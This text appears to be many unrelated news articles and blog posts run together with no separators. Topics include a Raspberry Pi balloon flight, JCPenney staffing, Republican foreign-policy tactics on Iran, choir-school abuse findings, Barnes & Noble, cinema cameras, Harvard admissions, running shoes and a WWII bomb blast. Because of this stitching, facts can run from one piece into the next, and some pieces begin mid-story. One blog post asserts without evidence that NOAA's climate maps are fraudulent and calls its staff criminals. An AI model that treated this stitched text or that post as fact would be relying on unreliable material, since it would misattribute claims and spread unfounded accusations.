High-altitude ballooning enthusiast Dave Akerman tethered one, complete with a webcam to photograph its progress, to a helium balloon.
The bare-bones computer managed to reach an altitude of almost 25 miles (40km) before the balloon popped and it returned to Earth.
The Pi sent live images throughout the flight and was safely retrieved by tracking its onboard radio transmitter.
Sky high
Mr Akerman decided to use a Raspberry Pi to control the payload on his near-space craft because its USB port made it easy to connect up a cheap webcam.
Prior to using the Pi, Mr Akerman had relied on payloads built around the Arduino microcontroller to power the sensor package lifted by the balloon.
These too can control a camera, however, said Mr Akerman they were much more expensive and harder to use than a familiar webcam.
"The Pi is not the obvious choice for this," he told the BBC. "I chose it because it was on my desk and I thought it would be a neat thing to use."
Using the Pi had introduced problems because it was relatively heavy, complicated and drew quite a lot of power, he said.
Image caption The Pi payload was protected against the harsh conditions in the upper atmosphere
On his blog, Mr Akerman detailed the process of solving these problems, which produced a flight computer that could take live images of its ascent, select the best shot, and then feed it back to ground control.
Also onboard was an altimeter and a radio beacon to help retrieve the high-altitude Pi.
Strong winds and rain delayed the launch, but when the balloon got off the ground it reached an altitude of 39,994m.
"Quite amazing for a medium-sized balloon with about 1kg (2lb) of payloads underneath it," wrote Mr Akerman.
The dramatic live pictures it sent during its journey are believed to the highest ever photographs transmitted from an amateur device anywhere in the world .
The onboard radio beacon ensured the craft could be tracked as it made its descent and helped Mr Akerman retrieve the pioneering machine when it came down only a few miles away from the launch pad.
He is now planning a second flight for his Pi craft, which survived its maiden flight completely unscathed. The next ascent will add a video camera to the payload to capture footage of its journey.
The clotheshorse just left the barn at JCPenney.
Nick Wooster, a flamboyant fashion blogger whose rapid rise under ousted Chief Executive Ron Johnson had baffled the rank and file, has left the company, The Post has learned.
The West Village dandy, feted in fashion circles for his handlebar mustache and arm sleeve tattoos, has been replaced as executive vice president of private brands by Ken Mangone, who held the post before leaving Penney last fall, sources said.
The shuffle echoed Johnson's surprise replacement as CEO last week by predecessor Mike Ullman, who had been at the helm of Penney for seven years before being pushed out in 2011.
“Another one bites the dust,” one insider said, noting Wooster is the latest casualty of Johnson's failed bid to revamp Penney into a cutting-edge fashion brand.
Penney didn't respond to requests for comment.
As first reported by The Post, other Johnson hires who have left include operating chief Mike Kramer, Chief Talent Officer Dan Walker and creative head Mike Fisher.
A former fashion director at Bergdorf Goodman, Wooster was tapped last spring to overhaul men's clothing. He showed up for his first day at Penney's Plano, Texas, offices dressed in shorts and a blazer, sources said.
Johnson brushed off concerns about Wooster's abrupt switch to bright colors and slim fits. By late fall, Wooster was leading Penney's private-label division.
“He changed his mind constantly and didn't communicate with anybody except his little circle of favorites,” a source said.
That's despite Johnson's repurpose of the annual holiday party for the private-label team into a welcoming party for Wooster.
“The theme was ‘Who's Wooster?' and they handed out questionnaires asking things like what his favorite color was,” said one ex-employee. Answer: camouflage.
I asked my scarf gifter for a light spring scarf, maybe something floral, thinking I'd be thrilled with any old, run-of-the-mill scarf (and I would have been, too!)
Wow. No words, gifter. I opened up the package and actually gasped when I pulled this out. A hand-knit scarf made from natural fibers. Green is my favorite color, I adore flowers....it's just absolutely perfect. You could not have made something more personal and lovely if you had known me. When I discovered that the button that makes up in the inside of the flower is what keeps it together, I just about couldn't believe how much work this must have taken you. To top it all off, it fits perfect. I am very particular about scarf length, and it falls precisely over my collarbone.
I'm completely blown away. Thank you so, so much. I love participating in these exchanges, and each gifter has given me something thoughtful and nice, but this is, sincerely, my favorite gift to receive.
Thank you again! I hope you received something wonderful after all the effort you put into my gift :)
Throughout Barack Obama's presidency, Republicans in Congress have deployed a strategy that has worked remarkably well for them: oppose, obstruct, and sabotage the Obama administration at every turn.
"The single most important thing we want to achieve is for President Obama to be a one-term president," Republican Sen. Mitch McConnell, then the Senate minority leader, said in 2010.
A few months later, McConnell acknowledged that Republicans had decided to deny President Obama any bipartisan support, not because they necessarily opposed each and every initiative, but to hurt Obama politically. "We worked very hard to keep our fingerprints off of these proposals," he said. "Because we thought — correctly, I think — that the only way the American people would know that a great debate was going on was if the measures were not bipartisan."
This strategy led Republicans to adopt largely unprecedented tactics of obstructionism and sabotage. But no matter how far they went, there was one line they always avoided crossing: undermining US foreign policy.
That line is now being crossed. Republicans, driven by earnest policy disagreements with Obama over his approach to Iran, are bringing the tactics they used to undermine Obama's legislative agenda into the previously sacrosanct realm of foreign policy.
"the GOP are blazing new trails in politicization of foreign policy — and debasement of their institutions"
Republicans are overtly sabotaging not just Obama's Iran policy, but also his constitutionally enshrined authority over foreign policy. This is unprecedented. If the trend continues — Republicans have already extended their efforts to Obama's relationship with Israel — it endangers not just US policy toward the Middle East, but the very way that the United States makes foreign policy.
The possible implications for the United States and its role as global leader should worry Americans of every political stripe.
Republicans are adapting the tactics they used against legislation like Obamacare to Obama's foreign policy
Until now, for all the tactics of obstruction Republicans used against Obama's legislative agenda, they generally treated foreign policy as sacrosanct. They got close only once before, when they threatened to block Obama's 2010 nuclear disarmament treaty with Russia. But they backed down when foreign policy graybeards from Henry Kissinger to Colin Powell told them to knock it off.
Republicans, after all, tend to prize America's role as the world's sole superpower. They see this as crucial to the future of the United States and would not put their own partisan political goals ahead of it. Even if they disagree with Obama's execution of foreign policy, and would say so openly, they refrained from sabotaging him in the way they had on domestic policy. Until the Iran talks.
Republicans are earnestly alarmed about the Obama administration's effort to negotiate a nuclear deal with Iran. They believe Iran is negotiating in bad faith and will exploit any deal to further its nuclear program. Though many analysts find this argument unpersuasive, it is a valid position, and it's fair play to oppose the Iran deal on those grounds. But that opposition has grown into something much bigger than that, and with consequences beyond Iran policy.
Republicans, joined by some Democrats, tried for months to pass new economic sanctions on Iran. The aim was clear: to kill the negotiations, humiliating Obama on the world stage in the process. The US is offering sanctions relief to Iran as part of any deal. By passing new sanctions while the talks are still ongoing, Congress would send the message that the president is not actually in charge of foreign policy and that the US cannot be trusted to uphold its word. Iran would have little choice but to walk away.
Republicans have not been able to pass new sanctions; Democrats, and even a number of Republicans, have seemed unwilling to so openly embarrass their own president on the world stage.
The moment the line was crossed came on January 8, when McConnell and House Speaker John Boehner took matters into their own hands. They secretly arranged for Israeli Prime Minister Benjamin Netanyahu, who also opposes Iran talks and has a famously poor relationship with Obama, to speak to a joint session of Congress urging them to kill the negotiations.
"We are sailing into uncharted waters"
Even Fox News was outraged: here was a foreign ally going behind the president's back, working with an opposition party to undermine the sitting president of the United States. And Republicans were helping him do it.
"We are sailing into uncharted waters," Robert Kagan, a prominent foreign policy hawk who worked in the Reagan-era State Department and later on John McCain's foreign policy team, wrote in an alarmed Washington Post op-ed. "Bringing a foreign leader before Congress to challenge a US president's policies is unprecedented."
Kagan warned that in some ways, the even greater danger was that such tactics could well become routine: "After next week," he wrote, "it will be just another weapon in our bitter partisan struggle."
After Netanyahu's visit, Republicans went further still. Forty-seven Republican senators signed an open letter, organized by superhawk Sen. Tom Cotton, to Iranian leaders hinting that they could blow up any deal between the US and Iran if they disapproved.
"Congress violates the Constitution by hosting the speech"
The mere act of senators contacting the leaders of a foreign nation to undermine and contradict their own president is an enormous breach of protocol. But this went much further: Republicans are telling Iran, and, by extension the world, that the American president no longer has the power to conduct foreign policy, and that foreign leaders should assume Congress could revoke American pledges at any moment.
"Iran's ayatollahs need to know before agreeing to any nuclear deal," Sen. Cotton told Bloomberg View, that "any unilateral executive agreement is one they accept at their own peril."
A foreign leader reading this letter — whether he or she is Iranian or not — is learning that you are better off walking away than trying to negotiate, in good faith or bad, with the United States of America.
"Between the Netanyahu invite and the Cotton letter, the GOP are blazing new trails in politicization of foreign policy — and debasement of their institutions," David Rothkopf, the CEO of the Foreign Policy group and a scholar at the Carnegie Endowment for International Peace, tweeted. (I've cleaned up the abbreviations common to Twitter.)
In some ways, it looks like Obamacare all over again. Much as Republicans attempted to stop or subvert Obamacare by undermining the institutions responsible for passing and implementing it, they are now seeking to stop or subvert the Iran negotiations by weakening US foreign policy itself. And much as their brinksmanship and obstructionism on Obamacare exacerbated the partisan polarization that has broken Congress, they are now risking similar damage to the ability of the world's lone superpower to conduct its foreign affairs — well beyond just Iran policy.
The polarization of foreign policy puts all US interests at risk, including the security of Israel
There are legitimate policy disagreements over Iran negotiations in Washington, so the line between principled policy opposition and unprincipled partisan sabotage can be blurry. It may help, then, to examine how Republicans' new approach is damaging a US policy that should be less controversial: support for Israel.
The bipartisan consensus on Israel goes back decades. Republican leaders, by inviting Netanyahu to Congress behind Obama's back, and by pressuring members of Congress to side with Netanyahu against their own president, are both exploiting and endangering that bipartisan consensus.
Republicans' hope is that by forcing members of Congress to choose between Israel and Obama, Congress will side with Israel, and thus against Obama. But the risk is that some will side with Obama and against Israel — many Democrats signaled as much by refusing to attend the speech — and that support for Israel will thus become an increasingly partisan issue.
As "pro-Israel" becomes increasingly coded as a Republican issue rather than a bipartisan one, it will likely help Republicans win certain races, but it will substantially erode the consensus on Israel and thus risk eroding US support for Israel. If you earnestly care about Israel, and about the US-Israel relationship, then this trend should alarm you.
Republicans' tactics are so extreme they may be unconstitutional
A premise of Republican meddling on Iran and Israel is that Congress has a right — indeed, a responsibility — for oversight of some aspects of US foreign policy. This is true, and Sen. Cotton's letter points out as an example that the Senate will have to approve any formal treaty between the US and Iran.
Still, Congress' role in foreign policy is constitutionally quite limited. For over 200 years the president has been designated as the "sole organ of the nation in its external relations, and its sole representative with foreign nations," as founding father John Marshall put it in an 1800 speech that the Supreme Court codified into constitutional law in 1936.
The idea of what became known as the "sole organ" doctrine is that the US government needs to be a single unified entity on the world stage in order to conduct effective foreign policy. Letting the president and Congress independently set their own foreign policies would lead to chaos.
There is disagreement over where constitutional law draws the line between what role Congress is and is not allowed in US foreign policy. But it seems awfully clear that House Speaker John Boehner going behind the president's back to negotiate with the Israeli leader violates at the very least the spirit of constitutional limits on Congress.
Indeed, a number of constitutional legal scholars — some of them quite conservative — have questioned the constitutionality of Republicans' actions.
David Bernstein of George Mason University wrote at the Washington Post that Boehner's invitation to Netanyahu "violates constitutional norms that have been observed for generations" and was contrary to the separation of powers. He explained, "Direct diplomatic relations with foreign governments are exclusive in the executive." Boehner disobeyed that.
Another constitutional scholar, Michael Ramsey, put it more simply: "Congress violates the Constitution by hosting the speech." The point is not that John Boehner is going to be dragged before the Supreme Court — he won't — but that Republicans crossed a line that wasn't just a matter of protocol, but of strict and meaningful constitutional limits in how foreign policy is conducted.
And that was before Sen. Cotton and 46 other Republican senators wrote the Iranian leader to tell him to disregard President Obama's promises.
It's worth pointing out there is a law specifically prohibiting US citizens from negotiating with foreign governments without official permission, and thus interfering in the foreign policy of the United States. Called the Logan Act, it's named for a state legislator who corresponded with French officials in 1798 without his government's permission because he disapproved of US policy toward France.
Cotton is not going to face prosecution for violating the Logan Act. "No one is ever actually prosecuted under the measure," legal scholar Peter Spiro wrote recently. "It's a more focal point for highlighting structural aspects of foreign relations." And that's the point: the letter goes way beyond the legally articulated limits on Congress' role in foreign policy.
The spirit of the Logan Act, like the "sole organ" doctrine, is meant to enforce the idea that the president is in charge of foreign policy. It's not supposed to be like legislation, where Obama and Congress fight it out on a somewhat level playing field. It's meant to be unified. Republicans, by trying to change that, are undermining the very premise of how US foreign policy is supposed to work.
Fracturing foreign policy between the president and Congress would be a disaster for US interests
The greatest harm, should Republicans continue this trend, would be to the ability of the US president to credibly conduct American foreign policy.
Even if you agree with Republicans that Obama's Iran talks are a bad idea, the fact that Republicans have gone beyond opposing a deal to overtly undermining US foreign policy should worry you. Republicans are now freelancing their own foreign policy, conducting shadow diplomacy with both Israel and Iran, dividing US foreign policy against itself.
Who, a foreign leader might reasonably ask, is really in charge in Washington? How can I risk negotiating with the US when Congress might sabotage any deal we strike? How can I make difficult, politically painful concessions to the US if Republicans might end up pulling out the rug from under me? How much can I really trust the US to uphold its word? How safe a bet is working with the Americans?
One of the central lessons of this dysfunctional era in American politics is that one side's overreach quickly becomes the other side's tactic. If you're a Republican, you should ask what you will think if these practices are normalized. What will you think when Democrats in Congress employ these tactics to undermine a Republican administration?
This is not to say that the world will shrug off American leadership; the US is still the Earth's most powerful and important country. But foreign policy is won or lost on the margins more often than you might think. International agreements can succeed or fail with just a smidge more or less trust between the parties. A major US foreign policy challenge this century will be competing for regional influence with powers such as China and Russia. If you're, say, the foreign minister of Myanmar, trying to decide whether to throw in with China or with America, you are going to be a little less likely to hedge toward the US if you think its foreign policy-making apparatus is fundamentally broken.
Throughout Obama's presidency, Republicans have frequently warned that he is projecting insufficient strength or will to maintain America's global standing. It seems odd, then, that their answer to this is to publicly undermine and humiliate the president — and thus sacrifice, for short-term partisan gain, the American resolve and leadership they see as so important for the world.
WATCH: 'Obama on his foreign policy goals - The Vox Conversation with the POTUS'
New Jersey Gov. Chris Christie dropped out of the presidential race today. That's not that surprising, after his sixth-place finish in yesterday's New Hampshire primary. But what is a bit interesting is speculation that his decision might have been prompted by the rules governing who will get to participate in the next Republican debate, which will take place this Saturday, February 13, and will be aired on CBS.
By placing sixth in New Hampshire, Christie did not qualify for the debate. But he would have qualified, and thus possibly stayed in the race, if he had gotten more votes than Marco Rubio. There was a pretty big difference between the two candidates' vote totals (about 9,000 votes). Nonetheless, it is reasonable to consider whether there are 9,000 voters in New Hampshire who did not vote for Christie but would prefer he stays in the race. For example, consider the more than 11,000 people who voted for Carly Fiorina, who also just announced that she is ending her bid.
These multicandidate, multistage electoral contests are classic situations for strategic voting. In particular, until the very last vote the proper way to think about whom you should vote for involves thinking not only about whom you like the most, but also about how your vote will affect the candidacies of the other alternatives. Particularly in this primary season, the "early" states will effectively determine the set of candidates that voters in the later states get to pick from.
Of course, I don't believe that Christie (ever) had a strong chance of winning the nomination. But as we saw in the previous GOP debate, Christie's presence in the race might have affected who will win it.
NOAA is getting increasingly shameless with their monthly climate reports, claiming the Earth is red rot.
Global Climate Report – August 2017 | State of the Climate | National Centers for Environmental Information (NCEI)
Most of their red hot land data is fake. The gray areas represent missing data, and show that they have very little actual temperature data in Africa or South America.
201708.gif (1052×743)
The fact that they don't have any data doesn't stop the criminals at NOAA from declaring record heat in those regions.
NOAA erases almost all of the blue from their maps, and turns many gray areas into record heat. The reason they commit this fraud is because they know they can get away with it, and the press will never question them.
Nearly 550 German Choirboys Abused At Renowned Catholic School, Report Says
Enlarge this image toggle caption Armin Weigel/AFP/Getty Images Armin Weigel/AFP/Getty Images
Over a span of roughly a half-century, at least 547 boys at a famed Catholic choir school experienced some form of significant abuse, according to an independent investigation released Tuesday. The 440-page report details an environment that some former pupils likened to a "prison, hell and a concentration camp," which persisted for decades under the direction of Pope Emeritus Benedict XVI's older brother.
The education at the Regensburg Domspatzen — a boys' choir that enjoys worldwide renown and has been around for upwards of a millennium — "was oriented toward top musical achievements and the choir's success," the report said, as translated by The New York Times. "Alongside individual motives, institutional motives — namely, breaking the will of the children with the aim of maximum discipline and dedication — formed the basis for violence."
Of the hundreds of cases listed by attorney Ulrich Weber, whose report was commissioned in 2015 by the Regensburg diocese, 67 are believed to have been cases of sexual abuse.
And "these are not 547 cases where an individual was affected once," former choir member Alexander Probst told Reuters. "Rather, this was an ongoing practice over decades where 547 children were tormented, abused, mistreated and socially harmed."
Weber concentrated especially on the period between 1945 and 1992, during which time Georg Ratzinger, Benedict's brother, led the choir for about three decades. Ratzinger, who has previously acknowledged slapping students and apologized, was singled out by Weber "for turning a blind eye and not intervening despite having knowledge." Reuters does note that the investigation did not find that Ratzinger was aware of sexual abuse.
The allegations of child abuse surfaced in 2010, when German media published a number of revelations, prompting additional accusers to come forward.
"It's somewhat unclear when they brought these complaints to the attention of church authorities," journalist Thomas Marzahl told NPR's Linda Wertheimer at the time. "But it is clear that — from the anger that some of these victims are expressing — that they feel like the church has ignored their issues and has tried to put a wall of silence over the matter."
The Times notes that it was "only after intense pressure from the victims" that the diocese commissioned Weber's investigation, which ultimately found that 49 individuals at the school perpetrated the abuse over the decades examined.
Ratzinger, 93, did not immediately respond to the allegations — though Michael Fuchs, vicar general of the Regensburg diocese, defended him at a news conference Tuesday.
"He is and was a passionate musician, priest and educator and he's an emotional person, who also slapped students, especially in the beginning. He also stated that in an interview and regrets it," Fuchs said, according to CNN. "He received hints [of the abuses] over and over again, but he didn't pay enough attention to them. He apologized to the victims in an interview, and I can't see that he changed his view on this."
The Associated Press reports that Rudolf Voderholzer, bishop of Regensburg, plans to give victims between $5,730 and $22,930 each in compensation by the end of the year.
"We all made mistakes and have learned a lot," Fuchs said. "We see today that we could have done things better and sooner."
Over the weekend, I drove to a local mall to go see a movie, but got stuck in traffic and missed the showtime--so I visited the mall's Barnes & Noble bookstore instead.
Beyond My Ken/Wikipedia
It was the first time I'd been in this particular Barnes & Noble in awhile, and I noticed several changes. For one thing, a large booth selling B&N's Nook e-readers was located so close to the front doors that it was impossible to enter the store without seeing the Nooks and overhearing a staffer explaining them to other shoppers.
Reminders of the Nook's virtues were strategically placed elsewhere in the store, too, such as signs in the magazine section touting digital magazine subscriptions.
Barnes & Noble has been selling books since 1873, but it's selling fewer of them these days--or at least devoting less floor space to them. Areas that were once filled with books are now devoted to greeting cards, toys and games, and other products. And most of the folks on the store's upper floor were hanging out at the spacious coffee shop, not browsing the shelves.
The tweaks were no mystery: Barnes & Noble is changing because the way we read is changing. For most of the venerable merchant's history, reading generally involved something you might have bought in a bookstore: a book, a magazine, or a newspaper. Today, however, all of these materials compete with digital books and magazines, not to mention the Web itself. It's not entirely clear that the world will need great big physical bookstores forever.
Julie Bosman of The New York Times has a great piece on B&N and its CEO, William Lynch, and how they're trying to make the digital transition while keeping 703 brick-and-mortar bookstores relevant. It mentions some of the changes I noticed during my visit, plus more. (The company is experimenting with smaller stores and is phasing out its CD and DVD sections.)
Bosman's article explains that the companies that produce books are deeply concerned about Barnes & Noble's ongoing viability. With longtime arch-rival Borders dead, it's the country's only national bookstore chain, and its failure would be a catastrophic blow to the publishing ecosystem. So the industry wants it to stick around for a long time to come.
Me, too. And while I don't know a thing about the book business, I do buy a lot of books--and I have a few suggestions for further changes that might increase B&N's appeal in the digital age.
A more inventive selection, more inventively displayed. Sorry, B&N, but my favorite local bookseller is Green Apple Books, an independent in San Francisco that's filled to the brim with fascinating stuff. I can't go in there without immediately stumbling across several books I want to buy. By comparison, today's B&N stores have a bland, cautious feel: They're largely about the books I already know, not the ones I'd never discover otherwise.
More art books. Nooks, Kindles, and iPads still aren't great when it comes to heavily illustrated volumes. Their screens are too small and they don't have enough pixels. I suspect that coffee table books will still sell well even after novels and other more text-oriented books have mostly gone digital, so the more of them B&N stocks, the better.
Discounts! When B&N stores first started popping up everywhere, the chain's slogan was "If you paid full price, you didn't get it at Barnes & Noble." Somewhere along the line, the company ditched automatic price breaks on non-bestsellers in favor of discounts granted only to members of a club that costs $25 a year. (It must be a profit center--at the store yesterday, a cashier was trying to browbeat customers into joining up.) Given that B&N's principal competitor is Amazon, where discounts of 30, 40, and 50 percent are the norm, its books almost always feel overpriced. Might it sell many more if it charged a little less?
Bundling. What if you could stroll into a Barnes & Noble, buy a dead-tree book, and add the Nook digital version for a modest fee? Publishers probably hate this notion, since they'd see it as devaluing the digital editions. But I'll bet they'd hate the possibility of B&N going out of business or closing hundreds of stores even more.
I don't bring up these ideas because I think that they haven't occurred to Barnes & Noble. Actually, I'm sure it's considered all of them. But I'm rooting for the chain to figure out a future that works--and if there are Barnes & Noble stores 20 or 30 years from now, the only thing we know for sure is that they'll be strikingly different from the ones we know today.
Cinematography, perhaps more than any other aspect of filmmaking, has experienced tremendous change as a result of shifting technology. One of the biggest disruptions has been the creation of bigger, high-resolution images using digital cameras with large sensors.
The trend rose to prominence with 2015's “The Revenant,” for which DP Emmanuel Lubezki earned his third consecutive Oscar. About 40% of the film was shot with the large-format Arri Alexa 65, a camera introduced in 2014. When the Alexa 65 debuted, a big question among DPs was whether such a high-resolution, data-rich image was necessary — or even desirable. The camera's sensor is equipped with a huge active-imaging area, even larger than the film gate in Arri's 65mm film camera, and significantly larger than a 35mm film frame, the industry standard for many decades.
Other entrants among higher-resolution cinema-grade cameras include Sony's F65 and Red's Weapon. Among questions that arose: Would the exponential increase in data, and the attendant headaches and expense, be worth it, artistically and financially? And would the additional resolution result in harsh images and a hyper-realism that some thought would destroy the magic of cinema?

Today, those concerns appear to have been overblown. Advocates say that larger formats have been successful largely because their image is more immersive and subconsciously perceived as closer to human vision.
Big Picture: Ben Davis used both vintage Panavision lenses and the Alexa 65 for “Doctor Strange.”
The trend is especially evident among tentpoles. While some cinematographers are loathe to give up the option of film emulsion for certain stories, many others agree that the larger digital formats deliver images that are pleasing and incredibly detailed without the plastic or crispy feel of early digital cameras.
The trend toward large-format digital has driven a concurrent evolution in lenses. The choice of “glass” has always been a crucial decision for any cinematographer's aiming to create a specific
look, but the advent of digital has made lens choice even more important. Large-format sensors require lenses that work with the bigger target, and lens-makers have quickly met the demand by fashioning new products. Examples include Arri's 65mm lenses, which use Hasselblad glass, Panavision's Primo 70 line, and Vantage Film's Hawk65 anamorphics.
Cinematographers have also gone retro, reviving and restoring long-mothballed lenses that sometimes date back to the widescreen formats of the 1950s and '60s. Robert Richardson, who resurrected the Ultra Panavision 70 film format on “The Hateful Eight,” shot his most recent assignment, “Live by Night,” using the Alexa 65 and Super Panavision 70 and Sphero 65 lenses. The Panavision 70s were reportedly those used on “Lawrence of Arabia,” a title long revered by camera pros.
“The Panavision vintage lenses had a soft and creamy patina that mixed beautifully with the attributes of the Arri Alexa 65,” says Richardson. “I was continually surprised by the quality of what we captured. At this time, 65mm film cannot be compared to a larger digital sensor, but that might prove to be a false statement in the years to come.”
The wide range of release formats is also a consideration for DPs. For “Ghost in the Shell,” Jess Hall created a look that paid homage to the original anime series.
“I've been searching for a digital camera that had the resolution to handle all kinds of [movie] distribution, along with the ability to reproduce the subtlety of color that's very prominent in anime,” says Hall. “I also felt that the perspective in anime — wide angle, but with no lens distortion — was an important feature to bring to the movie.”
In this new large-format world, the trend is to adapt the lens to the job at hand. For example, Panavision's lens guru Dan Sasaki tailored a set of Sphero 65 lenses to Hall's specifications for “Ghost.”
“I have a set of older Cooke lenses I like, but they won't cover the larger image area of the 65mm sensor,” says Hall. “Dan translated some of those qualities to the Spheros.”
In the upcoming “Doctor Strange,” DP Ben Davis combined the Alexa 65 with vintage Panavision lenses.
“I found that on the Alexa 65, close-ups look stunning,” says Davis. “My fear was that it would be too clean, too sharp, but the additional information in the highlights and shadows, in combination with those lenses, created the very natural feel I've been looking for in digital cinematography.”
Davis acknowledges that the new technology is more expensive. “But in terms of the overall budget,” he says, “it's insignificant.”
The Red Weapon 8K is the latest camera to enter the large-format fray. Henry Braham recently became the first DP to use it on a feature, Marvel's “Guardians of the Galaxy 2.”
“We were looking for a great, big-screen theatrical experience,” says Braham. “I really liked the 8K because of the intensity and astounding quality. It's a very rich, engaging image, and there's almost an added dimension to it because of the amount of detail in the texture.”
Again, Panavision's Sasaki helped out by tuning the geometry of the Primo 70 lenses to fit the 8K format.
“The resulting sharpness and the range were what drew me to the lenses,” says Braham. “These cameras bode well for the future of filmmaking, and hopefully for the business side as well.”
Google staked a claim in one of the most ad-saturated neighborhoods in the world this week with a billboard the width of a city block. After signing a long-term deal with Vornado Realty Trust reportedly worth millions, the company began advertising on the biggest billboard in New York City's Times Square — over 20 million pixels big.
The Mitsubishi Electric screen occupies the entire block of Broadway that lies between 45th and 46th street, and even wraps about another 30 feet around each corner. Its true resolution is 2,368 x 10,048, and it measures over 77 feet tall by 323 feet long. It will reportedly be under Google's control until the end of January 2015.
Google Street View images of the billboard's construction from May and September 2014
The rotating series of graphics on the eight-story-tall screen promote many of Google's best known offerings, like Google Maps and Android. The latter dominates the billboard, provoking passersby to "Androidify" themselves by creating a personalized version of the Android Robot with an Android tablet-equipped employee on the ground. Each person's creation eventually appears somewhere on the billboard, and while people wait there are options to get a postcard or shirt emblazoned with their newly-created likeness.
If you're on the block it occupies, the billboard easily towers over you. When you're up extremely close to it you're even likely to feel a quick hit of vertigo. It's the kind of thing that almost singularly stands out from the visual din — until it disappears as you walk a few blocks away past the unlicensed Elmos and find a bigger crowd staring at a Revlon billboard one-fifth the size.
Harvard is nearly 400 years old. Adam Glanzman/Getty Images
For the first time in its nearly 400-year history, Harvard has admitted a majority of nonwhite class, The Boston Globe reported.
Official figures released by the college show that the entering class of 2021 is:
• 22.2% Asian American
• 14.6% African American
• 11.6% Hispanic or Latino
• 2.5% Native American or Pacific Islander
Of the entering freshman class, 50.8% are from minority groups, an increase from the 47.3% figure last year, The Globe reported.
The news comes just as the Department of Justice indicated it planned to review a complaint of discrimination at Harvard University related to its admissions process.
An anti-affirmative action group called Students for Fair Admissions filed a lawsuit against Harvard in 2015, alleging that the college and other Ivy League institutions use racial quotas to admit students to the detriment of more qualified Asian-American applicants. The group includes a coalition of more than 60 Asian-American groups.
What do your running shoes say about you?
http://patprice.com

If you didn't see the Saturday Night Live goof on New Balance this weekend, here it is.
“Comfort. Support. Stability.
New Balance shoes, made for running…
…but worn by chubby white guys in their late 30's to early 40's.
New Balance sneakers have advanced cushioning in the forefoot…
…because if you were running, you'd need that.
That same cushioning helps me just stand here.”
What do your running shoes say about you?
The New Balance commercial was great. Is it 100% true? Of course not, but there's always some truth, or perceived truth to stereotypes. For every Brenda Martinez, or Jenny Simpson, you will see 95 white guys rocking some perfectly worn Newbies on the street of any city in America. I'm as guilty as the next. They are super comfy!
But with that in mind, here's what I think if I see you wearing:
Nike Free's
Vibe you're putting out: “I kind of like running, but I'm more into LIFTING. I ran 1.5 miles at 7.1 miles per hour yesterday. Gotta keep up my endurance.”
I wear them because: “Have you seen the commercial with the crane or better yet, the nude running camp commercial? or that other guy at the gym. He benches 315. Sick free's too.”
Conclusion: Comfortable grass or pool running shoe. They are not a racing flat. They look great on you gymrats.
Vibram Five Fingers
Vibe you're putting out: “I don't have enough “No” people in my life.”
I wear them because: “Everyone at my CrossFit box has a pair.”
Conclusion: Unless you just finished “Born to Run” and are in the middle of a long, single track trail run, stay away. By all means, don't buy the leather ones either. They are not, I repeat not, dress shoes.
Skechers GOrun's
Vibe you're putting out: “I wanted the Nike Free's, but the colors weren't terrible enough.”
I wear them because: “Did you see that guy tackle the cheetah on the Super Bowl Commercial or Mr. Quiggly? (paging Sean Quigley, sponsorship!) or that ad in the last 15 Runner's Worlds? That Meb guy won the Olympics. Or was it New York? Definitely the Olympics.”
Conclusion: The market hasn't been flooded with GOruns yet, but it will be. I predict they'll be all over every theme park, all summer.
Newton's
Vibe you're putting out: “I'm really into triathlons and/or want to stand out, not by my times at local roadies, but by what kind of shoes I am wearing.”
I wear them because “I went to this test run at my local running store and the rep told me they are the only shoes that help you have perfect form. And Josh Cox runs in them. Oh wait, he switched to K-Swiss? Do y'all carry those?”
Conclusion: Good shoe, but gimmicky. Buy a pair and the next thing you know, you'll be running in a visor.
Hoka One One's
Vibe you're putting out: “Loved the minimalist thing, until I got shin splints. Now I'm maximalist all the way, baby!”
I wear them because: “Everyone else was getting Newton's, so I had to upgrade!”
Conclusion: A soft landing, but the ugliest on the market. Wear if you dare!
Spira's
Vibe you're putting out: “I do my running shoe shopping in Sky Mall.”
I wear them because: “They're spring loaded man and I got some informative, totally objective feedback on them on the Let's Run Message Board. Definitely not all people from Spira commenting. Definitely not.”
Conclusion: I see a lot of D-League Kenyans wearing them at local roadies. Most of the time they are half laced up. They win a lot of $200 purses in them. Maybe spring loaded is the answer?
*Note: I own every shoe above (aside from the Vibrams, of course. And the Spira's)

Russia's Latest Idea: An Internet Whitelist For Copyright Materials
from the that'll-work dept
Now that Sarkozy has been thrown out of office, France is no longer producing the steady stream of bad proposals for the Internet that it once generated. That has left an opening for some other country to take its place, and it seems that Russia is keen to pick up where Sarkozy left off. We've been reporting on previous worrying developments there, and TorrentFreak has news on another one: According to information obtained by Vedomosti, publishers of music, books and software have put forward amendments [to Russia's existing anti-piracy law] which will place a huge burden of responsibility not just on regular websites but also on search engines such as Google and local outfit Yandex.
The proposed amendments center around the creation of a national registry listing all music, software and books. This database will then be made available to search engines and site owners who will be required to consult it before servicing their users with links or content. The idea is to create a huge whitelist of approved sites holding copyright materials, and Web sites and search engines will be obliged to use it when linking to works requested by users. As we reported back in February, one region was planning to try that approach in order to produce a "clean Internet." That's clearly impossible, and so is the latest proposal -- both in terms putting together a complete whitelist, and trying to refer to it. As Yandex is quoted as saying in the TorrentFreak piece, the idea could have a wider chilling effect on real-time discussions online: "[If the amendments go through], rightsholders will switch the entire Internet into pre-moderation mode, because sites can not accommodate any comment without full verification of all the materials located on the link in this comment. For the bulk of services, this task is impossible," Yandex concludes. And it's not hard to see where this approach leads: replacing today's blacklists of sites that are blocked -- child pornography being the most obvious category -- to one of whitelists, which show the approved sites that aren't blocked. That's truly frightening, and not just for Russian users. As we've seen time and again, governments around the world have the awful habit of copying each other's ideas when it comes to regulating the Internet -- but usually only the bad ones. If this approach is brought in, it can only be a matter of time before people start calling for the same in other countries, citing Russia as an example of where it has already been implemented.

The bomb, which went off by accident after being hit by a construction worker in the town of Euskirchen, North Rhine-Westphalia last Friday, was of British origin, experts believe.
"We're quite sure now that it was a British aerial mine, " Rolf Vogelbacher from the bomb disposal unit of the Düsseldorf local authority told WDR broadcaster on Monday.
During World War II the Allies often bombed the town as a well-used transit point for German troops. Up to four large bombs are still found every year in the town, said local mayor Uwe Friedl.
Digger operators are well trained and very experienced with the dangers there - even the man who was killed on Friday when he hit the bomb by mistake at around 1.30pm on Friday afternoon.
Police believe the bomb had been very large. It was around 2.8 metres long and weighed 1.8 tons, 1.3 tons of which consisted of various explosives.
The blast broke windows up to six kilometres away, a police spokesman told Spiegel news site and it could reportedly be heard in Bonn - almost 30 kilometres away.
The vehicle burst into flames with the driver still inside, killing him. Thirteen others at the building site were injured, including two seriously.
Reports suggest that the effect of the blast could be felt for kilometres around Alfred-Nobel-Straße, where it took place.

